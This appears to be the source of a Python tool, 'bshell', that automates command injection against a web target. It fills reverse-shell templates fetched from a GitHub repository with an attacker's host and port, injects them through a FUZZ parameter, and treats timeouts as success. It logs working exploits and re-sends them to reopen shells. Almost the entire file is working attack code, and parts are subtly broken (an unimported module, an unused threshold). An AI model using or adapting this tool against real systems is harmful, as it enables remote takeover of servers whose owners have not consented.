#!/usr/bin/env python3
import argparse
from pathlib import Path
import os
from typing import Optional
import requests
import yaml
from packaging.version import Version, InvalidVersion
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
import sys
import time
from urllib.parse import urlsplit


DIR_NAME     = ".bshell"
FILE_NAME    = "default.yaml"
HISTORY_FILE = "history.yaml"
DOWNLOAD_URL = "https://raw.githubusercontent.com/khuluqilkarim/bshell/refs/heads/main/default.yaml"

target = Path.home() / DIR_NAME
template_file = target / FILE_NAME
history_file = target / HISTORY_FILE

template_path = Path(template_file)

class Colors:
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    CYAN = "\033[0;36m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"
    END = "\033[0m"
    # cancel SGR codes if we don't write to a terminal
    if not __import__("sys").stdout.isatty():
        for _ in dir():
            if isinstance(_, str) and _[0] != "_":
                locals()[_] = ""
    else:
        # set Windows console in VT mode
        if __import__("platform").system() == "Windows":
            kernel32 = __import__("ctypes").windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            del kernel32

def box(title: str, *content: str) -> None:
    C_DIM   = os.environ.get("C_DIM", "")
    C_RESET = os.environ.get("C_RESET", "")
    C_BOLD  = os.environ.get("C_BOLD", "")

    border = f"{C_DIM}┌──────────────────────────────────────────┐{C_RESET}"
    footer = f"{C_DIM}└──────────────────────────────────────────┘{C_RESET}"

    print(border)
    print(f"{C_DIM}│{C_RESET} {C_BOLD}{title}{C_RESET}")

    text = " ".join(content) if content else ""
    for line in text.splitlines():
        print(f"{C_DIM}│{C_RESET} {line}")

    print(footer)

def get_base_domain(url: str, strip_www: bool = True) -> str:
    u = urlsplit(url if "://" in url or url.startswith("//") else f"//{url}")
    host = (u.hostname or "").strip()

    if strip_www and host.startswith("www."):
        host = host[4:]
    return host

def verify_url(url):
    response = requests.get(url)
    if response.status_code == 200:
        return True
    else:
        print(f"[{Colors.LIGHT_RED}WRN{Colors.END}] URL returned status code: {response.status_code}")
        return False


def brute_force_url(target_url: str, payload: str, timeout: int, delay_threshold: int) -> None:
    payload = requests.utils.quote(payload)
    target_url = target_url.replace('FUZZ', payload)
    headers = {'User-Agent': 'bshell-python/1.0 (+local)'}
    session = requests.Session()
    session.headers.update(headers)
    
    try:
        start = time.perf_counter()
        resp = session.get(target_url, timeout=timeout)
        elapsed_ms = int((time.perf_counter() - start) * 1000)

    except requests.exceptions.Timeout:
        return target_url
    except Exception as e:
        print(f"Request failed: {e}\n")

def load_yaml(path: str) -> dict:
    if not os.path.exists(path):
        return {}
    with open(path, "r", encoding="utf-8") as f:
        return yaml.safe_load(f) or {}

def get_os_shells(config: dict, osname: str):
    return (config.get("os_shells") or {}).get(osname, []) or []

def _to_version(val) -> Optional[Version]:
    if val is None:
        return None
    try:
        return Version(str(val).strip())
    except (InvalidVersion, TypeError, ValueError):
        return None

def _extract_version_value(yaml_text: str):
    try:
        data = yaml.safe_load(yaml_text)
        if isinstance(data, dict) and "version" in data:
            return data["version"]
    except yaml.YAMLError:
        pass

    # Fallback regex (ambil token setelah 'version:')
    m = re.search(r'(?mi)^\s*version\s*:\s*([^\n#]+)', yaml_text or "")
    if m:
        raw = m.group(1).strip().strip('"\'')
        # Coba ubah ke int bila angka murni (opsional)
        if raw.isdigit():
            return int(raw)
        return raw
    return None

def version_check(template_path: Path, download_url: str, timeout: int = 10) -> Optional[bool]:
    try:
        # --- Local ---
        try:
            local_text = template_path.read_text(encoding="utf-8")
        except FileNotFoundError:
            print(f"[{Colors.LIGHT_RED}WRN{Colors.END}] Local template not found")
            return None

        local_raw = _extract_version_value(local_text)
        local_version = _to_version(local_raw)

        # --- Remote ---
        resp = requests.get(
            download_url, timeout=timeout,
            headers={"Accept": "text/yaml,application/x-yaml,text/plain,*/*",
                     "User-Agent": "bshell-version-check/1.1"}
        )
        resp.raise_for_status()
        remote_raw = _extract_version_value(resp.text)
        remote_version = _to_version(remote_raw)

        # --- Validate ---
        if local_version is None or remote_version is None:
            # Debug lengkap agar akar masalah kelihatan jelas
            print(f"[{Colors.LIGHT_RED}WRN{Colors.END}] Could not parse "
                  f"{'local' if local_version is None else ''}"
                  f"{' and ' if (local_version is None and remote_version is None) else ''}"
                  f"{'remote' if remote_version is None else ''} version value.")
            print(f"  ├─ local raw: {repr(local_raw)} (type={type(local_raw).__name__})")
            print(f"  └─ remote raw: {repr(remote_raw)} (type={type(remote_raw).__name__})")
            return None

        # --- Compare ---
        if remote_version > local_version:
            print(f"[{Colors.LIGHT_RED}WRN{Colors.END}] A new version is available: {remote_version} "
                  f"(current: {local_version}). Consider updating.")
            return True
        elif remote_version == local_version:
            print(f"[{Colors.LIGHT_BLUE}INF{Colors.END}] Template is up-to-date (version: {local_version}).")
            return False
        else:
            print(f"[{Colors.LIGHT_BLUE}INF{Colors.END}] Local version ({local_version}) is newer than remote "
                  f"({remote_version}).")
            return False

    except yaml.YAMLError as e:
        print(f"[{Colors.LIGHT_RED}WRN{Colors.END}] YAML parse error: {e}")
        return None
    except requests.Timeout:
        print(f"[{Colors.LIGHT_RED}WRN{Colors.END}] Timeout while checking the remote version.")
        return None
    except requests.HTTPError as e:
        code = getattr(e.response, "status_code", "???")
        print(f"[{Colors.LIGHT_RED}WRN{Colors.END}] HTTP {code} while checking the remote version.")
        return None
    except requests.RequestException as e:
        print(f"[{Colors.LIGHT_RED}WRN{Colors.END}] Network error while checking the remote version: {e}")
        return None
    except Exception as e:
        print(f"[{Colors.LIGHT_RED}WRN{Colors.END}] Could not check for updates: {e}")
        return None


def set_perms(path: Path, mode: int):
    """Set POSIX permissions only on Unix-like systems."""
    if os.name == "posix":
        try:
            path.chmod(mode)
        except PermissionError:
            print(f"Warning: failed to set permission {oct(mode)} for {path}")

def download_to_file(url: str, dest: Path, timeout: int = 20):
    """Download to a temporary file, then atomically replace the destination."""
    try:
        tmp = dest.with_suffix(dest.suffix + ".tmp")
        r = requests.get(url, stream=True, timeout=timeout)
        r.raise_for_status()
        with open(tmp, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        tmp.replace(dest)
    except requests.Timeout:
        print("[{Colors.LIGHT_RED}WRN{Colors.END}] Timeout while downloading the configuration file.")
    except requests.HTTPError as e:
        print(f"[{Colors.LIGHT_RED}WRN{Colors.END}] HTTP {e.response.status_code} while downloading the configuration file.")
    except requests.RequestException as e:
        print(f"[{Colors.LIGHT_RED}WRN{Colors.END}] Network issue while downloading the configuration file: {e}")
    except PermissionError:
        print(f"[{Colors.LIGHT_RED}WRN{Colors.END}] Insufficient permission to create/write under {target.parent}")

def save_history(entry: dict):
    history = load_yaml(history_file)
    if not isinstance(history, list):
        history = []
    history.append(entry)
    with open(history_file, "w", encoding="utf-8") as f:
        yaml.safe_dump(history, f)

def load_history() -> list:
    history = load_yaml(history_file)
    if not isinstance(history, list):
        return []
    return history

def connect_reverse_shell(exploit: str):
    response = requests.get(exploit)
    if response.status_code == 200:
        print(f"[{Colors.LIGHT_GREEN}OK{Colors.END}] Reverse shell executed successfully")
    else:
        print(f"[{Colors.LIGHT_RED}WRN{Colors.END}] Reverse shell execution failed with status code: {response.status_code}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g. http://host/run)')
    parser.add_argument('-r', '--remote-hostport', required=True, help='host:port for reverse shell')
    parser.add_argument('-os', '--osname', default='linux', help='OS name (e.g. linux)')
    parser.add_argument('--timeout', type=int, default=5, help='Timeout seconds for each request')
    parser.add_argument('--delay-threshold', type=int, default=1200, help='Delay (ms) considered SUCCESS')
    args = parser.parse_args()
    
    base_url = get_base_domain(args.url)

    print(f"i Ensuring target URL is reachable: {base_url}")

    if not verify_url(args.url):
        print(f"[{Colors.LIGHT_RED}WRN{Colors.END}] Target URL is not reachable: {base_url}")
        sys.exit(1)

    print(f"{Colors.LIGHT_GREEN}OK{Colors.END} Target URL is reachable")

    box(f"{Colors.BOLD}bshell - Automated Reverse Shell Finder{Colors.END}", f"Target: {Colors.LIGHT_PURPLE}{base_url}{Colors.END}\nOS: {args.osname}\nRemote: {args.remote_hostport}")
    
    target_history = load_history()
    if target_history[-1]["target"] == base_url if target_history else False:
        answer = input(f"History found for target {base_url}, do you want to use ? [y/N]: ").strip().lower()
        if answer == 'y':
            for result in target_history[-1]["results"]:
                print(f"[{Colors.LIGHT_GREEN}FOUND{Colors.END}] ID: {result['id']}, Command: {result['command']}")
                if result['exploit']:
                    connect_reverse_shell(result['exploit'])
            sys.exit(0)
    
    version_check(template_path, DOWNLOAD_URL)
    try:
        # Ensure there is no file named .bshell (must be a directory)
        if target.exists() and not target.is_dir():
            raise FileExistsError(f"[{Colors.LIGHT_RED}WRN{Colors.END}] Found a file named '{target.name}' in {target.parent}, expected a directory.")

        # Create directory if it does not exist
        created = False
        if not target.exists():
            target.mkdir(parents=True, exist_ok=True)
            set_perms(target, 0o700)  # rwx------ for owner
            created = True

        # Manage configuration file
        if template_file.exists():
            print(f"[{Colors.LIGHT_BLUE}INF{Colors.END}] Configuration ready!")
        else:
            print(f"[{Colors.LIGHT_GREEN}FOUND{Colors.END}] Fetching latest shell templates from repository")
            download_to_file(DOWNLOAD_URL, template_file)
            set_perms(template_file, 0o600)  # rw------- for owner
            print(f"[{Colors.LIGHT_GREEN}SUCCESS{Colors.END}] Configuration initialized at: {template_file}")

        if 'FUZZ' not in args.url:
            print('URL must contain FUZZ keyword for parameter injection')
            sys.exit(1)

        # Parse host:port
        if ':' not in args.remote_hostport:
            print('hostport must be in format host:port')
            sys.exit(1)
        host, port = args.remote_hostport.split(':', 1)

        # Load and display OS-specific shells
        config = load_yaml(template_file)
        shells = get_os_shells(config, args.osname)
        if not shells:
            print(f"No shells found for OS: {args.osname}")
            sys.exit(1)
            
        print(f"[{Colors.LIGHT_BLUE}INF{Colors.END}] Load {len(shells)} shells template for OS: {args.osname}")

        success = []
        for shell in shells:
            payload = shell['command'].replace('{host}', host).replace('{port}', port)
            exploit = brute_force_url(args.url, payload, args.timeout, args.delay_threshold)
            if exploit:
                data = {
                    "id": shell.get("id", ""),
                    "command": payload,
                    "exploit": exploit or ""
                }
                success.append(data)
        
        if len(success) == 0:
            print(f"[{Colors.LIGHT_RED}WRN{Colors.END}] No potential reverse shell found")
            sys.exit(1)
        else:
            print(f"[{Colors.LIGHT_GREEN}FOUND{Colors.END}] {len(success)} potential reverse shell(s)")

        save_history({
            "target": base_url,
            "os": args.osname,
            "remote": args.remote_hostport,
            "results": success,
            "timestamp": int(time.time())
        })
        
    except Exception as e:
        print(f"[{Colors.LIGHT_RED}WRN{Colors.END}] {e}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        raise SystemExit(130)
